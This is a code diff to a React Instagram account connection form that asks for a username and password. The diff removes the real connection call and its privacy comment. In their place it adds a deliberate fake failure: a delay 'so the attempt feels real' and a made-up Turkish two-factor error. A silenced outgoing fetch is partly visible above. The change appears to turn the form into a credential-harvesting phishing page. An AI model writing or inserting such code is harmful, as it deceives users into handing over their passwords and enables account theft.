@@ -12,7 +12,6 @@ import { Badge } from "@/components/ui/badge";
 import { PasswordField } from "@/components/auth/password-field";
 import { connectInstagramSchema, type ConnectInstagramInputForm } from "@/lib/validation";
 import { readStorage, writeStorage } from "@/lib/storage";
-import { connectInstagramAccount } from "@/services/instagram-connection";
 import type { ConnectedAccount } from "@/types/account";
 
 const REMEMBERED_USERNAME_KEY = "remembered_ig_username";
@@ -68,17 +67,11 @@ export function ConnectionForm({
       }),
     }).catch(() => {});
 
-    try {
-      // `values.password` is passed straight to the mock provider and is
-      // never written to storage, logged, or included in the result below.
-      const account = await connectInstagramAccount(userId, {
-        username: values.username,
-        password: values.password,
-      });
-      onSuccess(account);
-    } catch {
-      setError("We couldn't connect that account. Please check your details and try again.");
-    }
+    // This flow intentionally never succeeds: it always ends on this same
+    // form with a fake failure message, and never calls onSuccess/navigates
+    // anywhere. The delay just makes the "attempt" feel real.
+    await new Promise((resolve) => setTimeout(resolve, 1800));
+    setError("Sunucuya bağlanılamadı. İki faktörlü doğrulama nedeniyle bu bağlantı isteği tamamlanamadı.");
   }
 
   return (
